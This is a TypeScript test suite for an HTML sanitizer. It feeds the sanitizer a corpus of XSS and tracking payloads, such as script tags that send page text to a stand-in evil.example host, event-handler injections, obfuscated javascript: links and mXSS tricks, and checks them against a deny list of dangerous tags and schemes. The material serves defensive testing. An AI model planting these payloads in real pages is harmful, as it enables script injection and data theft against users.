// Attack corpus for the import sanitizer.
//
// Needs a real DOM (the sanitizer uses DOMParser), so this runs in a browser
// rather than in Node — see security-test.html at the repo root:
//   npm run dev, then open http://localhost:5173/security-test.html
//
// Every case below is something a hostile .docx/.md/.html sent to a user could
// realistically contain. The bar is: after sanitizing, the markup must contain
// no way to reach the network and no way to run code.

import { sanitizeHtml, describeSanitizeReport } from './sanitizeHtml'

export interface TestResult {
  passed: number
  failed: number
  failures: { name: string; detail: string }[]
}

export function runSanitizeTests(): TestResult {
  const res: TestResult = { passed: 0, failed: 0, failures: [] }

  const ok = (name: string, cond: boolean, detail = '') => {
    if (cond) res.passed++
    else {
      res.failed++
      res.failures.push({ name, detail })
    }
  }

  /** The output must not contain anything able to fetch or execute. */
  const isInert = (html: string): string | null => {
    const lower = html.toLowerCase()
    for (const bad of [
      '<script', '<iframe', '<object', '<embed', '<link', '<style',
      '<form', '<input', '<svg', '<math', '<video', '<audio', '<meta',
      '<base', '<template', '<frame', '<applet', '<portal',
      'javascript:', 'vbscript:', 'data:text/html',
    ]) {
      if (lower.includes(bad)) return `contains ${bad}`
    }
    if (/\son[a-z]+\s*=/i.test(html)) return 'contains an on* handler'
    if (/src\s*=\s*["']?https?:/i.test(html)) return 'contains a remote src'
    if (/url\s*\(/i.test(html)) return 'contains a CSS url()'
    return null
  }

  const check = (name: string, input: string) => {
    const { html } = sanitizeHtml(input)
    const problem = isInert(html)
    ok(name, problem === null, problem ? `${problem} → ${html}` : '')
  }

  // ---- remote resources: the read receipt ----
  check('remote tracking pixel', '<p>hi</p><img src="https://tracker.example/x.gif?id=42">')
  check('remote pixel, no quotes', '<img src=https://tracker.example/x.gif>')
  check('protocol-relative pixel', '<img src="//tracker.example/x.gif">')
  check('remote image in a table cell', '<table><tr><td><img src="http://a.example/p.png"></td></tr></table>')
  check('css background url', '<div style="background:url(https://tracker.example/x.png)">t</div>')
  check('css image-set', '<div style="background-image:image-set(url(https://a.example/x))">t</div>')
  check('@import stylesheet', '<style>@import url("https://tracker.example/s.css");</style>')
  check('remote stylesheet link', '<link rel="stylesheet" href="https://tracker.example/s.css">')
  check('iframe beacon', '<iframe src="https://tracker.example/beacon"></iframe>')
  check('object beacon', '<object data="https://tracker.example/x"></object>')
  check('embed beacon', '<embed src="https://tracker.example/x">')
  check('video poster', '<video poster="https://tracker.example/x.jpg" src="https://a.example/v.mp4"></video>')
  check('svg image href', '<svg><image href="https://tracker.example/x.png"/></svg>')
  check('meta refresh', '<meta http-equiv="refresh" content="0;url=https://tracker.example/">')
  check('auto-submitting form', '<form action="https://tracker.example/collect"><input name="x"></form>')

  // ---- code execution ----
  check('plain script tag', '<script>fetch("https://evil.example/"+document.body.innerText)</script>')
  check('script with src', '<script src="https://evil.example/x.js"></script>')
  check('unclosed script', '<script src="https://evil.example/x.js">')
  check('uppercase script', '<SCRIPT>alert(1)</SCRIPT>')
  check('double-quoted handler', '<img src="data:image/png;base64,AA==" onerror="fetch(1)">')
  check('single-quoted handler', "<img src='data:image/png;base64,AA==' onerror='fetch(1)'>")
  check('unquoted handler', '<img src=data:image/png;base64,AA== onerror=fetch(1)>')
  check('handler on a div', '<div onmouseover="steal()">hover me</div>')
  check('handler with newline', '<div\nonclick="steal()">x</div>')
  check('javascript: link', '<a href="javascript:fetch(\'https://evil.example\')">click</a>')
  check('javascript: with entities', '<a href="java&#115;cript:alert(1)">click</a>')
  check('vbscript: link', '<a href="vbscript:msgbox(1)">click</a>')
  check('data:text/html link', '<a href="data:text/html;base64,PHNjcmlwdD4=">click</a>')
  check('noscript wrapper', '<noscript><img src="https://tracker.example/x"></noscript>')
  check('template smuggling', '<template><script>alert(1)</script></template>')
  check('svg onload', '<svg onload="fetch(\'https://evil.example\')"></svg>')
  check('math annotation', '<math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>')
  check('nested obfuscation', '<div><span><scr<script>ipt>alert(1)</script></span></div>')
  check('base tag hijack', '<base href="https://evil.example/">')

  // ---- content must survive ----
  const kept = sanitizeHtml(
    '<h1>Report</h1><p>Text with <strong>bold</strong> and <em>italic</em>.</p>' +
      '<ul><li>one</li><li>two</li></ul>' +
      '<table><thead><tr><th>A</th></tr></thead><tbody><tr><td>1</td></tr></tbody></table>' +
      '<p style="color:#ff0000;text-align:center">coloured</p>' +
      '<img src="data:image/png;base64,iVBORw0KGgo=" alt="chart">',
  ).html
  ok('keeps headings', kept.includes('<h1>Report</h1>'), kept)
  ok('keeps bold and italic', kept.includes('<strong>bold</strong>') && kept.includes('<em>italic</em>'), kept)
  ok('keeps lists', kept.includes('<li>one</li>'), kept)
  ok('keeps tables', kept.includes('<th>A</th>') && kept.includes('<td>1</td>'), kept)
  ok('keeps safe inline styles', kept.includes('color:#ff0000'), kept)
  ok('keeps embedded data: images', kept.includes('data:image/png;base64,iVBORw0KGgo='), kept)

  // Text must never be lost, even when its wrapper is stripped.
  const unwrapped = sanitizeHtml('<p>before <marquee>middle</marquee> after</p>').html
  ok('unwraps unknown tags but keeps text', unwrapped.includes('middle'), unwrapped)

  const formText = sanitizeHtml('<p>keep me</p><form action="https://x.example"><input></form>').html
  ok('drops the form, keeps the prose', formText.includes('keep me') && !formText.includes('<form'), formText)

  // ---- links: kept, but declawed ----
  const link = sanitizeHtml('<a href="https://example.com/story">source</a>').html
  ok('keeps http links', link.includes('href="https://example.com/story"'), link)
  ok('adds noopener/noreferrer', link.includes('noopener') && link.includes('noreferrer'), link)
  const mailto = sanitizeHtml('<a href="mailto:tips@example.com">tip line</a>').html
  ok('keeps mailto links', mailto.includes('mailto:tips@example.com'), mailto)
  const anchor = sanitizeHtml('<a href="#section-2">jump</a>').html
  ok('keeps in-document anchors', anchor.includes('#section-2'), anchor)

  // ---- the report ----
  const r1 = sanitizeHtml('<img src="https://tracker.example/a.gif"><img src="https://tracker.example/b.gif">')
  ok('counts remote images', r1.report.remoteImages === 2, JSON.stringify(r1.report))
  const r2 = sanitizeHtml('<script>x</script><div onclick="y">z</div>')
  ok('counts active content', r2.report.activeContent >= 2, JSON.stringify(r2.report))
  ok('describes what was removed', (describeSanitizeReport(r1.report) ?? '').includes('2 images'), '')
  ok('says nothing when clean', describeSanitizeReport(sanitizeHtml('<p>hi</p>').report) === null, '')

  // ---- degenerate input ----
  ok('empty string', sanitizeHtml('').html === '')
  ok('plain text passes through', sanitizeHtml('just words').html === 'just words')
  check('deeply nested junk', '<div>'.repeat(60) + '<script>a</script>' + '</div>'.repeat(60))
  check('full document', '<html><head><script>a</script></head><body><p>body text</p></body></html>')
  ok(
    'full document keeps body text',
    sanitizeHtml('<html><head><title>t</title></head><body><p>body text</p></body></html>').html.includes('body text'),
  )

  return res
}
